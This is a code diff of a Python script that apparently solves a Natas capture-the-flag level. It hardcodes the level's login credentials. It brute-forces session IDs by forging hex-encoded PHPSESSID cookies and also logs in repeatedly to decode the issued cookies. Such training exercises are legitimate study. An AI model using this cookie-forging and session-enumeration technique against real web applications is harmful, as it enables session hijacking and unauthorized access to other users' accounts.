@@ -1,7 +1,8 @@
-from base64 import b64encode
+from builtins import str, bytes
 from time import sleep
 
 import requests
+from base64 import b64encode
 
 idx = 0
 pw = ''
@@ -10,25 +11,28 @@ userAndPass = b64encode(b"natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs").decode("asc
 headers = {'Authorization': 'Basic %s' % userAndPass}
 
 
-def doRequest(username, sessionid):
+def injectCookie(username, sessionid):
     cookie_sessionid = str(sessionid)+'-'+username
     cookie_sessionid = cookie_sessionid.encode('utf-8').hex()
     print("sending %s" % cookie_sessionid)
     res = requests.get(url, headers=headers, cookies={'PHPSESSID': cookie_sessionid })
     return res
 
+def createCookie(username):
+    res = requests.post(url, headers=headers, data={'username': username, 'password': 1})
+    return res
 
 while idx < 640:
     idx += 1
     print("looking for %i" % idx)
 
-    resp = doRequest('natas19', idx)
-
-    if "Password: " in resp.text:
-        print(resp.text)
-
-    # val = resp.cookies['PHPSESSID']
-    # print(bytes.fromhex(val).decode('utf-8'))
+    #resp = injectCookie('natas19', idx)
+    #if "Password: " in resp.text:
+    #    print(resp.text)
+    # OR
+    resp = createCookie('natas19')
+    val = resp.cookies['PHPSESSID']
+    print(bytes.fromhex(val).decode('utf-8'))
 
     sleep(0.3)
 
